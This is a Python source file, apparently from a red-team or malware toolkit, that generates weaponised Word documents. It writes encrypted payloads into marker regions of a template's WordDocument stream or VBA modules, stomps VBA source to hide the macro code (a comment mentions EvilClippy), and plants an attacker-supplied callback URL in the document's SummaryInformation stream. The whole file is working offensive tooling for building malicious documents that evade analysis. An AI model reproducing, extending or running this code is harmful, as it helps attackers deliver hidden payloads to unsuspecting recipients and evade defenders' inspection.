import binascii
import itertools
import logging
import os
import struct
from binascii import hexlify
from io import BytesIO
from typing import Optional, List

from olefile import olefile
from oletools.olevba import decompress_stream, copytoken_help
from pcodedmp.pcodedmp import getWord, getDWord

logger = logging.getLogger(__name__)

def findmarker(content):
    marker = ("A" * 100).encode()
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find("!".encode(), offset + len(marker))
        if offset_end != -1:
            return offset, offset_end - offset

    return -1, 0


def findmarker_old(content):
    marker = b''.join(bytes([0xAC, 0x00, int(c, 16), 0x00]) for c in "DEADBEEFCAFEBABE")
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find(marker, offset + len(marker))
        if offset_end != -1:
            return offset, ((offset_end + len(marker)) - offset) // 4

    return -1, 0





def replacemarker(contents, offset, encrypted_bytes_instructions):
    # First, get the existing stream bytes for comparison
    old_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]  #stream.read(length * 4)

    contents = contents[:offset] + encrypted_bytes_instructions + contents[offset + len(encrypted_bytes_instructions):]

    # For good measure, read them back
    new_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]  #new_bytes = stream.read(length * 4)

    print(old_bytes)
    print(new_bytes)

    return contents

def get_vba_offsets(contents):
    offset = 0

    vba_offsets = {}

    module_name = ""
    module_offset = 0

    while offset < len(contents):
        tag = getWord(contents, offset, '<')
        wLength = getDWord(contents, offset + 2, '<')

        if tag == 9:
            wLength = 6
        elif tag == 3:
            wLength = 2

        match tag:
            case 26:
                module_name = contents[offset + 6:offset + 6 + wLength].decode('utf-8')
                print(f"Module name: {module_name}")
            case 49:
                module_offset = getDWord(contents, offset + 6, '<')
                print(f"Module offset: {module_offset}")
                vba_offsets[module_name] = module_offset

        offset += 6
        offset += wLength

    return vba_offsets

def open_word_template(template_path: str):
    with open(template_path, 'rb') as file:
        template_file = file.read()

    file_data = BytesIO(template_file)
    ole = olefile.OleFileIO(file_data, write_mode=True)

    # Parse the VBA dir to get a hold of the offsets
    if not ole.exists("Macros/VBA/dir"):
        logger.error(f"OLE dir Macros/VBA/dir does not exist")
        return None, None

    return file_data, ole


def generate_word_file(template_path: str, encrypted_payloads: List[bytes], stomp_vba: bool) -> Optional[BytesIO]:
    file_data, ole = open_word_template(template_path)

    for x in encrypted_payloads:
        print(len(x))
        print(f"{(len(x)):04X}")
        print(','.join(str(b) for b in x))

    data_to_write = (''.join(map(lambda x: f"{(len(x)):04X}{binascii.hexlify(x).decode().upper()}", encrypted_payloads))).encode()

    if not file_data:
        return None

    contents = ole.openstream("WordDocument").read()
    offset, length = findmarker(contents)

    if offset != -1:
        logger.info(f"Marker found in document at: [{offset}] length: [{length}]")

        if length < len(data_to_write):
            logger.error(f"Payload is too big for document! ({len(data_to_write)} > {length})")
            return None

        contents = replacemarker(contents, offset, data_to_write)
        ole.write_stream(f"WordDocument", contents)

    if stomp_vba:
        dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())

        module_offsets = get_vba_offsets(dir_stream)

        # We have messed up the mapping between modules and OLE paths using EvilClippy, so pick the largest offset and put it in NewMacros
        biggest_offset = sorted(module_offsets.items(), key=lambda x: x[1], reverse=True)[0][1]
        contents = ole.openstream(f"Macros/VBA/NewMacros").read()
        contents = contents[:biggest_offset].ljust(len(contents), b'\x00')
        ole.write_stream(f"Macros/VBA/NewMacros", contents)

        # for directory, vba_offset in module_offsets.items():
        #     contents = ole.openstream(f"Macros/VBA/{directory}").read()
        #     contents = contents[:vba_offset].ljust(len(contents), b'\x00')
        #     ole.write_stream(f"Macros/VBA/{directory}", contents)

    ole.close()
    file_data.seek(0)

    return file_data


def generate_word_file_old(template_path: str, encrypted_payload: bytes) -> Optional[BytesIO]:
    file_data, ole = open_word_template(template_path)

    if not file_data:
        return None

    dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())

    module_offsets = get_vba_offsets(dir_stream)

    for directory, vba_offset in module_offsets.items():
        contents = ole.openstream(f"Macros/VBA/{directory}").read()

        offset, length = findmarker(contents)

        if offset != -1:
            logger.info(f"Marker found in module [{directory}] at: [{offset}] length: [{length}]")

            if length < len(encrypted_payload):
                logger.error(f"Payload is too big for document! ({len(encrypted_payload)} > {length})")
                return None

            encrypted_bytes_padded = encrypted_payload.ljust(length, b'\x00')
            encrypted_bytes_instructions = bytearray(
                [b for byte in encrypted_bytes_padded for b in [0xAC, 0x00, byte, 0x00]])

            contents = replacemarker(contents, offset, encrypted_bytes_instructions)

        contents = contents[:vba_offset].ljust(len(contents), b'\x00')
        ole.write_stream(f"Macros/VBA/{directory}", contents)

    ole.close()
    file_data.seek(0)

    return file_data

def generate_info_file(template_path: str, url: str) -> Optional[BytesIO]:
    marker_url = 'http://111.111.111.111:12345/p/info/get?pad=a'.encode()
    replacement_url = url.ljust(len(marker_url), 'a').encode()

    file_data, ole = open_word_template(template_path)

    if not file_data:
        return None

    summary_stream = ole.openstream("\x05SummaryInformation").read()

    if summary_stream.find(marker_url) != -1:
        edited_summary = summary_stream.replace(marker_url, replacement_url)

        print(binascii.hexlify(summary_stream))
        print(binascii.hexlify(edited_summary))

        ole.write_stream("\x05SummaryInformation", edited_summary)

    ole.close()
    file_data.seek(0)

    return file_data


